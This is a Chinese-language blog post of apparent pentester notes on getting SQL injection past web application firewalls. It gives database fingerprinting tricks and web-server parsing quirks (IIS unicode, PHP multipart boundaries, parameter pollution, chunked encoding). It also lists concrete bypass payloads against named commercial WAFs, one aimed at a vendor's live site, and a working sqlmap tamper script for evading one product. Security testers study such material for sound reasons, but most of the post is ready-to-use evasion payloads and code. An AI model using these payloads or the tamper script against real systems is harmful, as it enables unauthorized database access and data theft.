---
layout: post
title: sql-injection-fuck-waf
date: 2018-06-29 
tag: sql-injection
---
0x0 前言 
0x1 注入点检测 
0x2 bypass waf 
0x3 自动化

### 0x0 前言
---
&emsp;&emsp;这里是简单对sql注入绕过waf的一个小总结，非安全研究员，这里不讲原理，关于原理搜集了一些其他大佬的文章（文章在最下面请自取），感谢他们的分享，比着葫芦画瓢，对着各大waf厂商跟着师傅们来一波实战,进行一个简单的总结。    
### 0x1 注入点检测
&emsp;&emsp;一般的注入还是很好判断的，特别是基于报错，但有的时候略微有些奇葩的环境，再加上一些乱七八糟 waf，就比较难搞了，这里简单总结了一些方法。
* 利用数据库独有的一些函数   
access  asc chr len #access-functions   
mysql   substring   substr length   
mssql   char ascii len substring    #mssql function str   
oracle  ascii  chr length  substr upper lower replace(x,old,new)   
这些数据库中一个通用的函数就是abs，如果觉得是int型注入不妨先试试2-abs(1),然后结合各类数据库的一些函数来判断是什么数据库的注入,当然对数据库了解越多越好。   

* 改变请求方式   
根据经验，一般情况下各脚本对http request method如下，这里以GET为例子，针对www.vul.com/?id=1来进行判断。   
php GET   
aspx GET   
asp GET POST COOKIE   
jsp GET POST   
平常渗透测试中总是遇到各种各样的waf，有的时候一个单引号就死了，这个时候首选的一些方法就是转换请求头了，毕竟GET不如POST，POST不如multipart/form-data，当然不要看到php就不去转换，任何情况下都要尝试一下。   
当然，可以用burp很方便的来进行change request method以及change body encoding。

&emsp;&emsp;之前碰到过一个有趣的例子，asp的站点可以通过cookie提交数据，而且可以使用len函数，可以初步判断为access或者mssql数据库，但是还是很头疼，最后一位大哥使用下面的函数可以判断成功。www.vul.com/2.asp?id=482  
&emsp;&emsp;483-chr(chr(52)&chr(57))    #=482  
&emsp;&emsp;chr(52) '4'       
&emsp;&emsp;chr(57) '9'    
&emsp;&emsp;chr(49) '1' #chr(52)&chr(57)为49 chr(49)为1 虽然最后也没什么卵用但还是挺有意思的     

* 数据库特性   
mysql   注释符号# --+ ` ;%00 /**/ 字符串可以使用成对的引号'admin' = admin'''   
mssql   注释符号-- /**/ ;%00   
oracle  注释符号-- /**/ admin=adm'||'in  
空白符号
MySQL5 09 0A 0B 0C 0D A0 20  
Oracle 00 0A 0D 0C 09 20  
MSSQL 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20  
mysql和mssql可以使用|来进行相关的运算，而oracle会把||当成连接字符。  

* web容器特性  
这里直接可以跳过看http://drops.xmd5.com/static/drops/tips-7883.html 这篇文章

```   
1. iis+asp(x)  
    1.%u特性: iis支持对unicode的解析，如:payload为[s%u006c%u0006ect],解析出来后则是[select]
     %u0061nd 1=1
    另类%u特性: unicode在iis解析之后会被转换成multibyte，但是转换的过程中可能出现:多个widechar可能会转换为同一个字符。
    如：select中的e对应的unicode为%u0065，但是%u00f0同样会被转换成为e s%u00f0lect
    iis+asp
    2.%特性: union selec%t user fr%om dd #iis+asp asp+iis环境下会忽略掉百分号，如：payload为[sele%ct], 解析出来后则是[select]
    3.asp/asp.net在解析请求的时候，允许Content-Type: application/x-www-form-urlencoded的数据提交方式select%201%20from%20user
    asp/asp.net request解析:
    4.在asp和asp.net中获取用户的提交的参数一般使用request包，当使用request(‘id’)的形式获取包的时候，会出现GET，POST分不清的情况，譬如可以构造一个请求包，METHOD为GET，但是包中还带有POST的内容和POST的content-type, 换一种理解方式也就是将原本的post数据包的method改成GET,如果使用request(‘id’)方式获取数据，仍会获取到post的内容
2. php+apache畸形的boundary
    1.php在解析multipart data的时候有自己的特性，对于boundary的识别，只取了逗号前面的内容，例如我们设置的boundary为—-aaaa,123456，php解析的时候只识别了—-aaaa,后面的内容均没有识别。然而其他的如WAF在做解析的时候，有可能获取的是整个字符串，此时可能就会出现BYPASS
    Content-Type: multipart/form-data; boundary=------,xxxx
    Content-Length: 191
    
    ------,xxxx
    Content-Disposition: form-data; name="img"; filename="img.gif"
    
    GIF89a
    ------
    Content-Disposition: form-data; name="id"
    
    1' union select null,null,flag,null from flag limit 1 offset 1-- -
    --------
    ------,xxxx--
    2.畸形method(header头中)
    某些apache版本在做GET请求的时候，无论method为何值均会取出GET的内容。如请求的method名为DOTA，依然会返回GET方法的值，即,可以任意替换GET方法为其它值，但仍能有效工作，但如果waf严格按照GET方法取值，则取不到任何内容
3. web应用层
    1.双重URL编码: 即web应用层在接受到经过服务器层解码后的参数后，又进行了一次URL解码
    2.变换请求方式：
    在web应用中使用了统一获取参数的方式: 如php里使用$_REQUEST获取参数，但WAF层如果过滤不全则容易bypass，如，waf层过滤了get/post，但没有过滤cookie，而web应用层并不关心参数是否来自cookie
    urlencode和form-data: POST在提交数据的时候有两种方式，第一种方式是使用urlencode的方式提交，第二种方式是使用form-data的方式提交。当我们在测试的时候，如果发现POST提交的数据被过滤掉了，此时可以考虑使用form-data的方式去提交  
4. hpp 
    asp.net + iis：id=1,2,3  #?str=a%27/*&str=*/and/*&str=*/@@version=0--
    asp + iis ：id=1,2,3
    php + apache ：id=3
    jsp + tomcat ：id=1
```
这里提供一种针对普通检测的方法，大家可自行发挥。
mysql int型： %20%26%201=1  mysql.php?id=1%20%26%201=1
![image](/images/posts/sql-injection-fuck-waf/1.png)
另外在字符型中 'and'1'='1是不需要加空格的，有时候也可以绕过一些waf判断
![image](/images/posts/sql-injection-fuck-waf/2.png)

### 0x2 bypasswaf
由于mysql的灵活性，这里以mysql绕过为主，针对各大主流waf厂商进行一个测试，主要测试在线版的，本地就安装了一个360主机卫士。
其中http://192.168.44.132/mysql.php?id=1是我本地的一个测试环境  
其中下面的绕过都是以fuzz为主，不考虑web容器的特性，尝试绕过联合查询 -1 union select 1，2，3 from dual  
- 百度云加速bypass  
union select    #filter  
from dual   #not filted  
select from dual    #filter  
只需要绕过select即可 使用--+aaaaaa%0a可bypass  
![image](/images/posts/sql-injection-fuck-waf/3.png)
- 360主机卫士bypass   
发现%23%0aand%230a1=1    可以绕过and 1=1 限制  
最后在union select from的时候却绕不过去    
直接使用大字符串来fuzz %23-FUZZ-%0a https://github.com/minimaxir/big-list-of-naughty-strings/blob/master/blns.txt 发现可以成功绕过waf  
![image](/images/posts/sql-injection-fuck-waf/4.png)
- 云锁  
union select 如下就可以绕过  
http://www.yunsuo.com.cn/download.html?id=1%20union/*!/*!select%201,2,3*/  
转换成multiform/data可轻松绕过 
![image](/images/posts/sql-injection-fuck-waf/7.png)
- 安全狗bypass  
直接搞就行了
![image](/images/posts/sql-injection-fuck-waf/6.png)
当然也可以chunked提交
![image](/images/posts/sql-injection-fuck-waf/chunked.png)
- 阿里云   
尝试使用自定义变量方式来绕过 @a:=(select @b:=`table_name`from{a information_schema.`TABLES` }limit 0,1)union select '1',@a  
@p:=(select)被过滤 fuzz下p参数使用@$:=(select)可以绕过  
union select 1被过滤   使用union%23aa%0a/*!select--%01%0a*/1,@$,3 可以绕过   
发现重点就是绕过表名 select 1 from dual 一些常规的方法测试无果 随便fuzz下注释/*!数字*/却偶然发现有俩个数据包遗漏  
想起了以前乌云上一哥的的一个漏洞https://wooyun.shuimugan.com/bug/view?bug_no=94367
![image](/images/posts/sql-injection-fuck-waf/alifuzz1.png)
难道是因为访问频率导致遗漏？随即我又进行了一些fuzz fuzz1w到5w数字型的注释 加大线程 发现遗漏了更多  
![image](/images/posts/sql-injection-fuck-waf/alifuzz2.png)
我想测试一下之前的waf挑战赛，发现之前提交的payload已经修复了，而且那个漏洞url无法访问了:(  所以无法确认。  
随即我又进行了一些超长字符串的fuzz 简单fuzz1w-10w 以500为step 发现现象更多了 可初步判断存在遗漏
![image](/images/posts/sql-injection-fuck-waf/alifuzz4.png)
### 0x3 自动化
以360主机卫士为例，编写sqlmap tamper脚本。  
正常无waf sqlmap联合查询如下：  
![image](/images/posts/sql-injection-fuck-waf/sqlmap.png)
开启主机卫士，放到浏览器调试，修改相关payload使其能正常运行。
最后tamper脚本如下：
```
from lib.core.enums import PRIORITY
from lib.core.settings import UNICODE_ENCODING
__priority__ = PRIORITY.LOW
def dependencies():
    pass
def tamper(payload, **kwargs):
    """
    Replaces keywords
    >>> tamper('UNION SELECT id FROM users')
    '1 union%23!@%23$%%5e%26%2a()%60~%0a/*!12345select*/ NULL,/*!12345CONCAT*/(0x7170706271,IFNULL(/*!12345CASt(*/COUNT(*) AS CHAR),0x20),0x7171786b71),NULL/*!%23!@%23$%%5e%26%2a()%60~%0afrOm*/INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x61646d696e AND table_schema=0x73716c696e6a656374--
    """
    if payload:
        payload=payload.replace("UNION ALL SELECT","union%23!@%23$%%5e%26%2a()%60~%0a/*!12345select*/")
        payload=payload.replace("UNION SELECT","union%23!@%23$%%5e%26%2a()%60~%0a/*!12345select*/")
        payload=payload.replace(" FROM ","/*!%23!@%23$%%5e%26%2a()%60~%0afrOm*/")
        payload=payload.replace("CONCAT","/*!12345CONCAT*/")
        payload=payload.replace("CAST(","/*!12345CAST(*/")
        payload=payload.replace("CASE","/*!12345CASE*/")
        payload=payload.replace("DATABASE()","database/**/()")
                
    return payload
```
可以成功获取到相关数据。
![image](/images/posts/sql-injection-fuck-waf/sqlmap2.png)
其他参考链接如下：  
```
http://www.anquan.us/search?keywords=bypass&content_search_by=by_bugs
http://drops.xmd5.com/static/drops/tips-7883.html
https://xianzhi.aliyun.com/forum/attachment/big_size/wafbypass_sql.pdf
http://drops.xmd5.com/static/drops/papers-4323.html  
https://www.cnblogs.com/xiaozi/p/6927348.html  
http://swende.se/blog/HTTPChunked.html#  
https://xz.aliyun.com/t/1239
http://www.sqlinjectionwiki.com/categories/2/mysql-sql-injection-cheat-sheet/  
https://mp.weixin.qq.com/s/S318-e4-eskfRG38HZk_Qw  
https://joychou.org/web/nginx-Lua-waf-general-bypass-method.html    #nginx lua waf  
https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF  
https://websec.ca/kb/sql_injection#MySQL_Comment_Out_Query  
https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-bypass/423
```



转载请注明：[whynot](https://notwhy.github.io/) » [sql-injection-fuck-waf](https://notwhy.gitbooks.io/2018/06/sql-injection-fuck-waf/)  


